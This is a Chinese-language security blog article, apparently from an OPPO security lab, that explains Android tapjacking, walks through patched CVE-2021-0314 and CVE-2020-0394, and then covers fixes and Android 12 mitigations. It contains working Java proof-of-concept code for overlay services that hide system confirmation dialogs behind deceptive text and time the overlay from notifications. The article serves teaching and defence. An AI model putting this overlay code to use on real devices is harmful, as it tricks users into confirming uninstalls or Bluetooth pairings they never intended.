> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/04pcy3V3mhyru4YCwiGJLg)

  

  

  

  

以上文章来自 OPPO 子午互联网安全实验室【heeeeen】的投稿，也欢迎广大朋友继续投稿，详情可点击击 [OSRC 重金征集文稿！！！](http://mp.weixin.qq.com/s?__biz=MzUyNzc4Mzk3MQ==&mid=2247485420&idx=1&sn=30fdc166501f04f06fb7913342fdc2de&chksm=fa7b06a0cd0c8fb6d6dc82068fb429d743876cd03f50807f8d3441f0fd3321e44c94fb8c9095&scene=21#wechat_redirect)了解~~

温馨提示：建议投稿的朋友尽量用 Markdown 格式，特别是包含大量代码的文章

**01. 简介**

  

点击劫持 Tapjacking，是一种欺骗用户进行点击的攻击技术，可存在于任何操作系统和浏览器之中，尽管原理简单，对于普通用户危害却极大，是一种容易忽视的安全威胁。  

Android 中的点击劫持原理如图 1 所示，当出现重要的、需要进行用户确认的安全对话框时，申请悬浮窗权限的恶意 APP 在受害 APP 之上进行部分覆盖，显示一个虚假的界面，隐藏了与安全相关的重要提示信息，但并未覆盖正常 APP 原有的按钮，诱骗用户进行错误地点击操作，点击事件结果最终传递到受害 APP，造成严重的安全后果。

![](https://mmbiz.qpic.cn/mmbiz_png/kVCSSCFiaG8IdhDrGZlUxhlJbcWA5WGyLGN11whZ4gHicjtqG8X5WoGoyd0jdfqPNVSZLO7yNF7xD9E1nV1c9Mng/640?wx_fmt=png)

图 1 点击劫持原理

在 Android 系统当中，要能够在其他 APP 的界面之上显示，恶意 APP 首先需要申请悬浮窗权限 SYSTEM_ALERT_WINDOW，该权限允许普通 APP 使用

WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY

标志位，在别的 APP 之上显示。按照 Android 的设计，该权限仅供很少的 APP 使用，当 Target SDK 大于等于 23 时，还需要经过用户手动同意（这也意味着 APP Target SDK < 23 时是默认开启的），曾有一段时间通过 GooglePlay 上安装的 APP，若申请 SYSTEM_ALERT_WINDOW 权限，在安装后均默认开启。该权限也经常被现实中的恶意 APP 滥用 [1]。

在具有悬浮窗权限之后，恶意 APP 还必须寻找一个劫持的时机，判断当前显示的 Activity 或者 Fragment 是否是重要的安全确认对话框，仅该时机实施点击劫持，否则达不到应有的攻击效果。而点击劫持时机的选取，则成为点击劫持攻击的关键问题。

**02. 劫持时机**

#### 

#### **_**2.1 获取顶端包名**_**

这是一种粗粒度的点击劫持时机寻找方法，主要方法是启动服务，不断监听当前在前台的应用，获取顶端包名，一旦检测到目标顶端包名存在，即启动恶意 Activity 进行覆盖，示例代码如下：

```
String pkgName = "com.android.certinstaller"; // 示例，用证书安装程序作为目标包名 
while (true) {
     if(getTopPackage()) {  // 如果检测到目标包名，则进行覆盖攻击
         Intent i = new Intent(MainActivity.this, OverlayActivity.class);
         i.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
         startActivity(i);
         MainActivity.this.finish();
                    
     }

 }
```

采用的方法包括：

• getRunningTasks：获取目前运行的 Activity 栈信息

•getRunningAppProcesses：获取当前运行 APP 进程信息

采用下面代码进行测试 getRunningTask，该方法在 Android 5 之后失效，在 Android 11 上测试，只能获取应用本身以及应用退到后台时的包名 (Launcher 应用的包名）。

```
private boolean getTopPackage() {
        ActivityManager am = (ActivityManager)mContext.getSystemService(ACTIVITY_SERVICE);
        ComponentName cn = am.getRunningTasks(1).get(0).topActivity;
        String topPackage = cn.getPackageName();
        Log.d(TAG, "topPackage: " + topPackage);
        if (pkgName.contains(topPackage)) {
            return true;
        }
        return false;
}
```

同样，getRunningAppProcesses 也只能获取应用自身的包名。

```
ActivityManager activityManager = (ActivityManager) getSystemService(Context.ACTIVITY_SERVICE);
List<ActivityManager.RunningAppProcessInfo> processInfo = activityManager.getRunningAppProcesses();
```

因此使用上述方法进行点击劫持攻击，在当前 Android 11 中已经失效，也不会被现实中的攻击者采纳。

#### **_2.2 主动请求、主动_****_劫持_**

恶意 APP 能够主动控制劫持的时机，可以主动请求敏感操作，在显示用户确认对话框的同时，直接在上悬浮一个虚假的对话框。Android 系统近期修复的一系列漏洞，均属于这种类型：

• CVE-2020-0306：蓝牙发现请求确认框覆盖

• CVE-2020-0394：蓝牙配对对话框覆盖

• CVE-2020-0015：证书安装对话框覆盖

• CVE-2021-0314：卸载确认对话框覆盖

• CVE-2021-0487 : 日历调试对话框覆盖

##### **漏洞案例：CVE-2021-0314**  

下面我们以 CVE-2021-0314 为例，说明这种漏洞的原理。  

漏洞位于框架代码

frameworks/base/packages/PackageInstaller/src/com/android/packageinstaller/UninstallerActivity.java，UninstallerActivity 可以接受外部 Intent 传入，并给用户提供一个卸载确认的确认框。例如，使用下列代码

```
Intent intent = new Intent();
intent.setComponent(new ComponentName("com.google.android.packageinstaller", "" +
         "com.android.packageinstaller.UninstallerActivity"));
intent.setData(Uri.parse("package:android")); // put arbitrary unstallable package name here
startActivity(intent);
```

将请求卸载包名 android，并展现如下对话框  

![](https://mmbiz.qpic.cn/mmbiz_png/kVCSSCFiaG8IdhDrGZlUxhlJbcWA5WGyLE46IegpvCXslCtCHa5nUFDrqdiazKMOPKhTwnibZenXMvwgianiczDv0mg/640?wx_fmt=png)

图 2 请求卸载的正常对话框  

若恶意 APP 已被授予 SYSTEM_ALERT_WINDOW 权限，那么可以在请求卸载的同时，展现一个虚假的对话框覆盖在正常的对话框之上。这个覆盖功能可以实现为一个服务，如 FloatingButtonService，包括以下内容：

（1）在 FloatingButtonService 的构造函数中设置虚假对话框的布局参数

```
LayoutParams
 windowManager = (WindowManager) getSystemService(WINDOW_SERVICE);
        layoutParams = new WindowManager.LayoutParams();
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            layoutParams.type = WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY;
        } else {
            layoutParams.type = WindowManager.LayoutParams.TYPE_PHONE;
        }
        layoutParams.format = PixelFormat.TRANSLUCENT;
        layoutParams.gravity = Gravity.LEFT | Gravity.TOP;
        layoutParams.flags = WindowManager.LayoutParams.FLAG_NOT_TOUCH_MODAL | 
          WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE | WindowManager.LayoutParams.FLAG_WATCH_OUTSIDE_TOUCH;
        layoutParams.width = 920;
        layoutParams.height = 300;
        layoutParams.x = 80;
        layoutParams.y = 800;
```

注意 FLAG_WATCH_OUTSIDE_TOUCH 参数，此参数可用于监听用户在对话框之外的点击，可用于虚假对话框的退出时机。

（2）使用按钮来作为对话框显示，服务启动时显示对话框，服务停止时销毁对话框

```
@Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        showFloatingWindow();
        return super.onStartCommand(intent, flags, startId);
    }

    @Override
    public void onDestroy() {
        if (windowManager != null && button != null) {
            windowManager.removeView(button);
        }
        super.onDestroy();
    }

    private void showFloatingWindow() {
        if (Settings.canDrawOverlays(this)) {
            button = new Button(getApplicationContext());
            button.setText("Overlay UninstallerActivity's Text to Show Something Else. " +
                    "Your alarm will ring in 5 minutes"); // 欺骗内容
            button.setBackgroundColor(Color.WHITE);
            windowManager.addView(button, layoutParams);
            button.setOnTouchListener(new FloatingOnTouchListener());
        }
    }
```

（3）监听对话框的退出时机，一旦在对话框之外有点击事件，即退出  

```
private class FloatingOnTouchListener implements View.OnTouchListener {
        private int x;
        private int y;

        @Override
        public boolean onTouch(View view, MotionEvent event) {
            switch (event.getAction()) {
                case MotionEvent.ACTION_OUTSIDE:
                    windowManager.removeView(button);
                default:
                    break;
            }
            return false;
        }
    }
}
```

恶意 APP 在请求卸载的同时，启动 FloatingButtonService 使用欺骗内容覆盖在正常的对话框之上。

```
Intent intent = new Intent();
intent.setComponent(new ComponentName("com.google.android.packageinstaller", "" +
         "com.android.packageinstaller.UninstallerActivity"));
intent.setData(Uri.parse("package:android")); // put arbitrary unstallable package name here
startActivity(intent);

Intent intent2 = new Intent(MainActivity.this, FloatingButtonService.class);
startService(intent2);
```

![](https://mmbiz.qpic.cn/mmbiz_png/kVCSSCFiaG8IdhDrGZlUxhlJbcWA5WGyLia4BwAJuIRPVxOicwUFuhxNGIniaYUHH57hZDSmtTgeogNZehw3Xy7FuA/640?wx_fmt=png)

图 3 请求卸载的虚假对话框  

注意虚假对话框其实只覆盖了正常对话框中除按钮以外的其他部分，下面的按钮还是属于 PackageInstaller 应用的，当用户点击 OK 时，其实已经卸载了恶意 APP 请求卸载的 package，而此时恶意 APP 也已经监听到了 ACTION_OUTSIDE 事件，于是主动退出。在整个欺骗过程中，用户难以察觉自己其实已经确认了一次卸载操作。

#### **_2.3 监听对话框出现的其他信息_**

除了” 主动请求、主动劫持 “这种恶意 APP 可以主动控制劫持时机的情况，恶意 APP 还可以监听用户确认对话框出现的其他时机，例如有特定的广播事件、特定的通知，在时机出现的时候进行劫持。例如，在重要对话框出现时，将出现一个通知，恶意 APP 可以监听通知该通知的出现，通过实现一个 NotificationListenerService，捕捉特定的通知，并启动服务，在原有对话框之上悬浮一个欺骗的对话框

```
public class ListenService extends NotificationListenerService {
    public void onNotificationPosted(StatusBarNotification sbn) {
        if (!sbn.getPackageName().equals(TARGET_PACKAGE)) return; // 监听特定包名

        Notification notification = sbn.getNotification();
        if (notification.extras.get("android.title").equals(TARGET_HINT)) { // 监听特定通知
            Log.d("sbn", "target notification received!");
            startOverlayService(); // 启动服务，进行劫持
        }
    }
```

**漏洞案例：CVE-2020-0394**

CVE-2020-0394 即为这种情况，当蓝牙配对发生时，蓝牙 APP 会发送一个通知，用户点击通知以后就会出现蓝牙配对对话框，供用户确认或取消

```
packages/apps/Settings/src/com/android/settings/bluetooth/BluetoothPairingService.java
 Notification.Action pairAction = new Notification.Action.Builder(0,
                res.getString(R.string.bluetooth_device_context_pair_connect), pairIntent).build();
        Notification.Action dismissAction = new Notification.Action.Builder(0,
                res.getString(android.R.string.cancel), dismissIntent).build();

        builder.setContentTitle(res.getString(R.string.bluetooth_notif_title))
                .setContentText(res.getString(R.string.bluetooth_notif_message, name))
                .setContentIntent(pairIntent)
                .setDefaults(Notification.DEFAULT_SOUND)
                .setColor(getColor(com.android.internal.R.color.system_notification_accent_color))
                .addAction(pairAction)
                .addAction(dismissAction);
```

恶意 APP 的 ListenService 可以监听此通知的出现，在通知出现的同时，触发通知、弹出蓝牙配对对话框，并立即启动 FloatingButtonService 覆盖，攻击效果与 1.2 章节类似，最终欺骗用户完成蓝牙配对。

**03. 点击劫持防范**

####   

#### **_**3.1 系统应用修复**_**

Android 系统应用可以申请

android.permission.HIDE_NON_SYSTEM_OVERLAY_WINDOWS

权限，并使用 SYSTEM_FLAG_HIDE_NON_SYSTEM_OVERLAY_WINDOWS LayoutParams 参数对此类漏洞进行修复，使用该参数后。三方应用即使应用

SYSTEM_ALERT_WINDOW 权限，也无法进行覆盖。修复方法是在

onCreate 方法中添加如下语句：

getWindow().addSystemFlags(SYSTEM_FLAG_HIDE_NON_SYSTEM_OVERLAY_WINDOWS);

上述 Android 系统中的点击劫持漏洞，大多采用这种方法进行修复。

#### **_**3.2 普通应用修复**_**

普通应用针对重要对话框的 View，传入 true 到如下方法

**public** void setFilterTouchesWhenObscured (boolean enabled)

或者设置 View 的布局文件属性 android:filterTouchesWhenObscured 为 true，均可以防止点击劫持攻击。此时，如果防御对话框被其他恶意窗体（包括 toast、dialog 或 window）覆盖时，所有的输入事件将会被过滤，防御对话框不再会对点击事件进行响应，也就防止了点击劫持。

另外一种方法是重写 View 的 onFilterTouchEventForSecurity 方法，在该方法中可以检测其他 APP 覆盖的情况

#### **_**3.3 Android 12 对点击劫持的缓解**_**

尽管 SYSTEM_ALERT_WINDOW 权限如此敏感，Android 系统似乎也很难将其禁用，一直在业务需求和安全隐私之间进行艰难的平衡。在点击劫持缓解方面，Android 12 将默认开启 setFilterTouchesWhenObscured 为 true[3]，在有其他 APP 覆盖的情况下，自动阻止 APP 接受输入事件。除非出现以下例外情况：

• 被自己覆盖：APP 被自己的窗体覆盖

• 被受信任窗体覆盖：包括辅助服务窗体、输入法窗体和 Assistant 窗体

• 可见度不高的窗体：安卓认为这样的窗体难以展现欺骗内容。

– 不可见窗体：窗体的 root view 为 GONE 或者 INVISIBLE

– 完全透明的窗体：alpha 属性设置为 0.0

– 半透明的系统 alert 窗体

由于 Android 12 对点击劫持的系统性缓解，Android VRP 也同步对规则进行了调整 [4]，滥用 SYSTEM_ALERT_WINDOW 权限的点击劫持漏洞也将不在 CVE 和奖励考虑范围之内。但究竟防御效果如何，有待进一步研究证实。

**参考**

[1]https://blog.nviso.eu/2021/05/11/new-malware-family-now-also-targets-belgian-financial-apps/

[2]WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY

[3]https://developer.android.google.cn/about/versions/12/behavior-changes-all#untrusted-touch-events

[4]https://www.google.com/about/appsecurity/android-rewards/

**最新动态**

[2021 “OPPO 安全 AI 挑战赛” 初赛正式启动](http://mp.weixin.qq.com/s?__biz=MzUyNzc4Mzk3MQ==&mid=2247487472&idx=1&sn=2a1e69dd58265c24acffc9c3d25e721c&chksm=fa7b0ebccd0c87aa3d7fcd73eead9e01a5ea5f7efd04cc3b9b31378165bbf436329aa7ceeacc&scene=21#wechat_redirect)

[揭秘潜藏在你手机里的 “广告大师”](http://mp.weixin.qq.com/s?__biz=MzUyNzc4Mzk3MQ==&mid=2247486998&idx=1&sn=837625f3784231c556efff5df9d9a62d&chksm=fa7b0f5acd0c864ca00aee0cf3325848011b2d6173b76c966e540692c27bba806083433390c8&scene=21#wechat_redirect)

[招聘专场 - 总有一个岗位适合你！](http://mp.weixin.qq.com/s?__biz=MzUyNzc4Mzk3MQ==&mid=2247486927&idx=1&sn=93167d5d17fe7d2ed3419accf982ce7c&chksm=fa7b0c83cd0c85958a790c0daa3228b78a309660b55696ee605faf17c34d41857e3711dc4cdc&scene=21#wechat_redirect)

[红蓝对抗之 ATT&CK 框架入门和解读](http://mp.weixin.qq.com/s?__biz=MzUyNzc4Mzk3MQ==&mid=2247487079&idx=1&sn=cc1d90f5664895737dd1ea5a5251bffe&chksm=fa7b0f2bcd0c863de63e0ad3414c0bea9baffce552ded592e4150994a265012f5c0601f8fb79&scene=21#wechat_redirect)  

[揭秘 QUIC 的性能与安全](http://mp.weixin.qq.com/s?__biz=MzUyNzc4Mzk3MQ==&mid=2247486735&idx=1&sn=233bf264097c4742b0d76e1f81933cd5&chksm=fa7b0c43cd0c8555fec4c5e0617520237bcea45f97706c1d6b3b4d27cb736509d1b4272b50db&scene=21#wechat_redirect)

[OPPO 互联网 DevSecOps 实践](http://mp.weixin.qq.com/s?__biz=MzUyNzc4Mzk3MQ==&mid=2247486168&idx=1&sn=9c2b467885e449d630008a97bd18daee&chksm=fa7b0b94cd0c82820314716c179f7cd7246309dd4c0ee19042caac251c2fa13b8b405d3c0c7f&scene=21#wechat_redirect)

![](https://mmbiz.qpic.cn/mmbiz_jpg/kVCSSCFiaG8K50St7Jazic4tm9Kq3qAUUWeQWnAACHnZISn42bL1uOrjJBAcPpJTgSed2jMDZ4xh7jQkzQTKk9aw/640?wx_fmt=jpeg)